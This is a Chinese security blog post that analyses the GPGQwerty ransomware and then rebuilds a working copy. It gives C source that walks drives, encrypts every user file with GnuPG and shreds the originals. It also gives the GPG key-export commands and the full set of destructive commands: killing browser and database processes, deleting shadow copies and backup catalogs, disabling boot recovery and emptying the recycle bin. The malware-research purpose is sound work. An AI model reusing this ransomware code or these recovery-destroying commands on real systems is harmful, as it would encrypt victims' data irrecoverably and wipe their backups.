*****本文作者：LiukerTeam，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**  
**

**3月初，勒索软件“GPGQwerty”是由[@MalwareHunterTeam](https://twitter.com/malwrhunterteam/status/971485334629478401)
发现，它利用了合法的软件 GnuPG 来加密受害者的文件、覆盖原始文件，并将 .qwerty 扩展名附加到被加密文件的文件名中。**

GnuPG，也称 GNU Privacy Guard 或 GPG。它是加密工具 PGP（Pretty Good Privacy）的非商业化版本，用于对
Email、文件及其他数据的收发进行加密与验证，确保通信数据的可靠性和真实性。

## 0x01 分析

> 说明：图5、图6、图7都来自于复现样本。

根据 McAfee 对样本的分析，共发现 GPGQwerty 的3个相关的样本，其 SHA-256 值分别为：

> 2762a7eadb782d8a404ad033144954384be3ed11e9714c468c99f0d3df644ef5
>
> 39c510bc504a647ef8fa1da8ad3a34755a762f1be48e200b9ae558a41841e502
>
> f5cd435ea9a1c9b7ec374ccbd08cc6c4ea866bcdc438ea8f1523251966c6e88b

庆幸的是 GPGQwerty 需要其他文件的支持才能运行，正因如此，所以 GPGQwerty 是一组文件，该组文件共有10个文件，其 SHA-256
值如下：

![GPGQwerty样本SHA-256值](https://image.3001.net/images/20180325/15219434451104.png!small)

图1 GPGQwerty样本SHA-256值  

而其中的 key.bat、run.js、find.exe 是在加密过程中起着至关重要作用的三个文件，感染的过程如下图：

![图2 GPGQwerty的感染过程（图片来源：McAfee
Blogs）](https://image.3001.net/images/20180325/15219434993369.png!small)  
图2 GPGQwerty的感染过程（图片来源：[McAfee Blogs](https://securingtomorrow.mcafee.com/wp-content/uploads/2018/03/2.png)）  

从图2中，第一个要启动的文件是 key.bat 文件，作为勒索软件的主要启动程序，其内容如下：

![图3 key.bat](https://image.3001.net/images/20180325/15219435559544.png!small)  
图3 key.bat  

在导入密钥后，key.bat 将启动 run.js，该文件将执行 find.exe（主程序），其内容如下：

![图4  run.js](https://image.3001.net/images/20180325/15219435889060.png!small)  
图4 run.js  

从图4中可知，find.exe 需要指定即将加密的驱动器盘符。

主程序 find.exe 通过用 taskkill 命令来终止一些进程，如图5：

![图5
find.exe中使用taskkill命令](https://image.3001.net/images/20180325/15219436423756.jpg!small)  
图5 find.exe中使用taskkill命令

然后，find.exe 使用 GnuPG（gpg.exe ）对文件进行加密，并将 .qwerty 扩展名附加到被加密文件的文件名中。

![图6
gpg.exe加密文件](https://image.3001.net/images/20180325/15219436785411.jpg!small)  
图6 gpg.exe加密文件  

文件加密后，find.exe 会使用 shred.exe 覆盖原始文件。

![图7
shred.exe覆盖原始文件](https://image.3001.net/images/20180325/15219437058277.jpg!small)  
图7 shred.exe覆盖原始文件  

最后，它会在每个包含加密文件的文件夹中创建一个名为 readme_decrypt.txt，其内容就是跟勒索者联系的联系方式，付款后就给你解密。

Ok，GPGQwerty 就分析完了，接下来就是对它的复现。

## 0x02 复现准备

在介绍复现之前，先介绍一下复现的环境~

###  **1\. 环境**

生产机：

  * 系统：Windows 7 ultimate sp1 x64
  * 工具：
    * Visual Studio 2008
    * IDA Pro 6.8

靶机：

  * 系统：Windows 7 ultimate sp1 x64

测试机：

  * 系统：Windows XP Professional sp3 x86

依赖组件：

  * GnuPG：
    * 文件：gpg.exe、iconv.dll
    * 下载地址：<https://www.gnupg.org/ftp/gcrypt/binary/gnupg-w32cli-1.4.22.exe>
  * GnuWin32：
    * 文件：libiconv2.dll、libintl3.dll、shred.exe
    * 下载地址：<https://jaist.dl.sourceforge.net/project/gnuwin32/coreutils/5.3.0/coreutils-5.3.0.exe>

### 2\. 准备

在测试机中，下载并运行
[gnupg-w32cli-1.4.22.exe](https://www.gnupg.org/ftp/gcrypt/binary/gnupg-w32cli-1.4.22.exe)，安装成功后，如图8所示：

  
![图8
GnuPG安装文件](https://image.3001.net/images/20180325/15219438123077.png!small)  
图8 GnuPG安装文件  

在安装目录（eg. C:\Program Files\GNU\GnuPG）中提取 GPGQwerty 需要的 gpg.exe、iconv.dll 两个文件。

GnuPG 安装完成后，下载并运行
[coreutils-5.3.0.exe](https://jaist.dl.sourceforge.net/project/gnuwin32/coreutils/5.3.0/coreutils-5.3.0.exe)，安装成功后，如图9所示：

![图9
GnuWin32安装文件](https://image.3001.net/images/20180325/1521943893546.png!small)  
图9 GnuWin32安装文件  

在安装目录的 bin 目录（eg. C:\Program Files\GnuWin32\bin）中提取 GPGQwerty 需要的
libiconv2.dll、libintl3.dll、shred.exe 三个文件。

### 3\. 生成密钥

使用 gpg.exe --gen-key 命令生成密钥，如图10所示：

![图10 生成密钥](https://image.3001.net/images/20180325/15219439916266.jpg!small)  
图10 生成密钥  

按照图10步骤走，这样密钥就生成了。

接着，就是以 ASCII 码的格式导出公钥、私钥和 owner-trust，命令如下：

    
    
    # 公钥
    $ gpg.exe --armor --export qwerty > qwerty-pub.key
    # 私钥
    $ gpg.exe --armor --export-secret-keys > qwerty-private.key
    # owner-trust
    $ gpg.exe --export-ownertrust > ownertrust.txt

### 4\. key.bat 和 run.js

这个两个文件代码就不累述，key.bat 的代码如图3所示，run.js 的代码如图4所示。

### 5\. find.exe

从上面的分析中得知，find.exe
的主要功能有：遍历和加密文件、创建README_DECRYPT.txt文件、关闭进程、清空回收站、删除卷影副本和备份目录、禁止开机自动修复，其中重点是遍历和加密文件。

在复现中，遍历文件夹和文件是直接调用三个 Windows API，分别是：

>   * _findfirst
>   * _findnext
>   * _findclose
>

具体代码如下：

    
    
    void walkFile(char *path) {
        intptr_t handle = -1;
        struct _finddata_t fileInfo;
    
        char filePath[MAX_FILE_PATH_LENGTH] = {0};
        sprintf_s(filePath, MAX_FILE_PATH_LENGTH, "%s\\*", path);
        if (-1 == (handle = _findfirst(filePath, &fileInfo))) {
            return;
        }
        createDecryptReadme(path, 1024);
        do {
            if (NULL != fileInfo.name
                && 0 != _strcmpi(fileInfo.name, ".")
                && 0 != _strcmpi(fileInfo.name, "..")
                && 0 != _strcmpi(fileInfo.name, "Recycle")
                && 0 != _strcmpi(fileInfo.name, "$RECYCLE.BIN")
                && 0 != _strcmpi(fileInfo.name, "temp")
                && 0 != _strcmpi(fileInfo.name, "windows")
                && 0 != _strcmpi(fileInfo.name, "Program Files")
                && 0 != _strcmpi(fileInfo.name, "Program Files (x86)")
                && 0 != _strcmpi(fileInfo.name, "Application Data")
                && 0 != _strcmpi(fileInfo.name, "AppData")
                && 0 != _strcmpi(fileInfo.name, "System Volume Information")
                && 0 != _strcmpi(fileInfo.name, "Boot")
                && 0 != _strcmpi(fileInfo.name, "ProgramData")
                && 0 != _strcmpi(fileInfo.name, "gnupg")
                && NULL == strstr(fileInfo.name, ".qwerty")
                && NULL == strstr(fileInfo.name, "README_DECRYPT.txt")
                && NULL == strstr(fileInfo.name, ".exe")
                && NULL == strstr(fileInfo.name, ".dll")
                && NULL == strstr(fileInfo.name, ".sys")) {
                sprintf_s(filePath, MAX_FILE_PATH_LENGTH, "%s\\%s", path, fileInfo.name);
                if ((fileInfo.attrib & _A_SUBDIR)) {
                    walkFile(filePath);
                } else {
                    if (0 == _access(filePath, 6)) {
                        encryptFile(filePath);
                    }
                }
            }
        } while (_findnext(handle, &fileInfo) == 0);
        // close
        _findclose(handle);
    }

在遍历的时候，会忽略一些文件夹或文件，比如：Recycle、Program Files、windows等。

遍历文件哦了的话，那么现在重点就是加密和重写文件，其用到了gpg.exe、shred.exe 两个程序，具体的代码如下：

    
    
    void encryptFile(char *filePath) {
        // encrypt file
        char command[MAX_COMMAND_LENGTH] = {0};
        int returnCode = -1;
        sprintf_s(command, MAX_COMMAND_LENGTH, "gpg.exe --recipient qwerty -o \"%s.qwerty\" --encrypt \"%s\"", filePath, filePath);
        returnCode = system(command);
        if (0 == returnCode) {
            // overwrite file
            sprintf_s(command, MAX_COMMAND_LENGTH, "shred.exe -f -u -n 1 \"%s\"", filePath);
            system(command);
        }
    }

而关闭进程、清空回收站、删除卷影副本和备份目录、禁止开机自动修复都是执行命令来实现，具体的命令如下：

    
    
    # 关闭进程
    taskkill /F /IM sql /T
    taskkill /F /IM chrome.exe /T
    taskkill /F /IM ie.exe /T
    taskkill /F /IM firefox.exe /T
    taskkill /F /IM opera.exe /T
    taskkill /F /IM safari.exe /T
    taskkill /F /IM taskmgr.exe /T
    taskkill /F /IM 1c /T
    # 删除卷影副本
    vssadmin.exe delete shadows /all /quiet
    wmic shadowcopy delete
    # 禁止开机自动修复
    bcdedit.exe bcdedit /set {default} bootstatuspolicy ignoreallfailures
    bcdedit.exe bcdedit /set {default} recoveryenabled no
    # 删除备份目录
    wbadmin.exe wbadmin delete catalog -quiet
    # 清空回收站
    del /Q /F /S %s$recycle.bin

Ok，到这 find.exe 也哦了~

## 0x03 复现过程

上一节中都是在做复现的准备工作，GPGQwerty 的复现样本，如图11所示：

![图11 GPGQwerty
的复现样本](https://image.3001.net/images/20180325/15219440488951.jpg!small)  
图11 GPGQwerty 的复现样本  

Ok，现在开始复现，在靶机中运行 key.bat（为了简单演示，该复现样本未做其他运行方式），如图12所示：

![图12 复现过程](https://image.3001.net/images/20180325/15219445167014.gif!small)  
图12 复现过程  

上图基本上复现了勒索软件“GPGQwerty”的感染过程。

最后的最后，说明一下：鉴于本人能力有限，文中难免会出现疏忽或是错误，还请大家多多指正。

## 0x04 参考

>   * [MalwareHunterTeam 的 Twitter: “Another GPGQwerty
> (https://t.co/ZhPVsQdwGI) sample: https://t.co/3ZskYh2bQ1 Explain for
> screenshots: Comes in a bundle, as already mentioned in @demonslay335's
> tweet. Actors starts operation w/ "key.bat". The ransomware is the
> "find.exe". "seleep" seems a typo. @BleepinComputer…
> https://t.co/ACWWpDbQP2”](https://twitter.com/malwrhunterteam/status/971485334629478401)
>   * [Qwerty Ransomware Utilizes GnuPG to Encrypt a Victims
> Files](https://www.bleepingcomputer.com/news/security/qwerty-ransomware-> utilizes-gnupg-to-encrypt-a-victims-files/)
>   * [Ransomware Takes Open-Source Path, Encrypts With GNU Privacy Guard |
> McAfee Blogs](https://securingtomorrow.mcafee.com/mcafee-labs/ransomware-> takes-open-source-path-encrypts-gnu-privacy-guard/)
>   * [Antivirus scan for
> 39c510bc504a647ef8fa1da8ad3a34755a762f1be48e200b9ae558a41841e502 at
> 2018-03-07 00:01:53 UTC -> VirusTotal](https://www.virustotal.com/en/file/39c510bc504a647ef8fa1da8ad3a34755a762f1be48e200b9ae558a41841e502/analysis/1520380913/)
>   * [Windows下如何安装 GnuPG](https://technet.microsoft.com/zh-> cn/library/hh420372\(v=sc.12\).aspx)
>   * [GnuPG Document - gpg man
> page](https://gnupg.org/documentation/manpage.html)
>   * [GPG入门教程 - 孤剑 - 博客园](https://www.cnblogs.com/AloneSword/p/4918791.html)
>   * [Back up your PGP keys with GPG](https://msol.io/blog/tech/back-up-your-> pgp-keys-with-gpg/)
>   * [Shred命令使用详解 -> CSDN博客](http://blog.csdn.net/boomjane_testingblog/article/details/60579470)
>   * [_finddata_t结构体用法 -> CSDN博客](http://blog.csdn.net/wangqingchuan92/article/details/77979669)
>

 ***本文作者：LiukerTeam，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

